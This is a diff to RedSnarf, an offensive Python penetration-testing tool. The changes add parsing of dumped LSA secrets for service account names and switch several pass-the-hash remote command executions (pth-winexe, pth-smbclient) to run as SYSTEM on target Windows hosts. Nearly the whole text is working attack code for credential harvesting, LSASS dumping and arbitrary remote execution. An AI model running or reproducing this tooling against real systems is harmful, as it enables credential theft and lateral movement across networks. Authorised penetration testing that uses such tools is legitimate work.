@@ -1003,6 +1003,28 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[-]Something went wrong getting os version",'red')
 					logging.error("[-]Something went wrong getting os version")
 	
+			
+			#NEW
+			#After lsa is dumped, check if file exists and is greater than 0 bytes in size
+			#if it is try and see if there are any available service account names to match with the passwords
+			
+			if os.stat(path+host+"/lsadump").st_size >0:
+				fo=open(path+host+"/lsadump","r").read()
+				if "_SC_" in fo:
+					print colored("[+]Checking for services running as users: "+host,'yellow')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
+					res = os.stat(path+host+"/users.txt").st_size > 3
+					if res==True:
+						try:
+							u = open(path+host+"/users.txt").read().splitlines()
+							for n in u:
+								if n:
+									print "\t"+n
+						except IOError as e:
+							print "I/O error({0}): {1}".format(e.errno, e.strerror)
+
 			print colored("[+]Checking for logged on users: "+host,'yellow')
 			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C query user > c:\\logged_on_users.txt \" 2>/dev/null")
 			os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get logged_on_users.txt\' 2>/dev/null")
@@ -1021,6 +1043,7 @@ def datadump(user, passw, host, path, os_version):
 				print colored("[-]No logged on users found: "+host,'red')	
 				logging.debug("[-]No logged on users found: "+host)
 
+			#TODO - This can probably be removed given the above check.
 			if service_accounts in yesanswers:
 				print colored("[+]Checking for services running as users: "+host,'yellow')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
@@ -1038,6 +1061,7 @@ def datadump(user, passw, host, path, os_version):
 				else:
 					print colored("[-]No service accounts found: "+host,'red')	
 					logging.info("[-]No service accounts found: "+host)
+
 			if lsass_dump in yesanswers:
 				if not os.path.isfile("/opt/Procdump/procdump.exe"):
 					print colored("[-]Cannot see procdump.exe in /opt/Procdump/ ",'red')
@@ -1135,7 +1159,7 @@ def datadump(user, passw, host, path, os_version):
 							if command[0:8]=="command=":
 								command=command[8:len(command)]
 								print colored("[+]Executing Command ",'yellow')+command
-								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
+								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
 						
 						elif line[0:8]=="[upload]":
 							
@@ -1202,7 +1226,7 @@ def datadump(user, passw, host, path, os_version):
 							if chkfile[0:5]=="file=":
 								chkfile=chkfile[5:len(chkfile)]
 								print colored("[+]Checking for file ",'yellow')+chkfile
-								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c dir "+chkfile+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c dir "+chkfile+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 								stdout_value = proc.communicate()[0]
 																
 								if not "bytes free" in stdout_value:
@@ -1217,7 +1241,7 @@ def datadump(user, passw, host, path, os_version):
 								chkdir=chkdir[4:len(chkdir)]
 								
 								print colored("[+]Checking for dir ",'yellow')+chkdir
-								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c dir "+chkdir+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c dir "+chkdir+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 								stdout_value = proc.communicate()[0]
 																
 								if not "bytes free" in stdout_value:
@@ -1484,7 +1508,8 @@ def datadump(user, passw, host, path, os_version):
 					deploydata=deploydata[108:].rstrip()
 					
 					deploydata=str(bytearray.fromhex(deploydata))
-					
+					print deploydata
+
 					if "<EncryptedValue>" and  "guestcustutil.exe" in deploydata:
 						print colored("\n[+]VMware Specific ",'green')
 						print colored("[+]Registry values indicate this machine may have been deployed via a VMware Template",'yellow')
@@ -2121,7 +2146,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5c", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5d", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
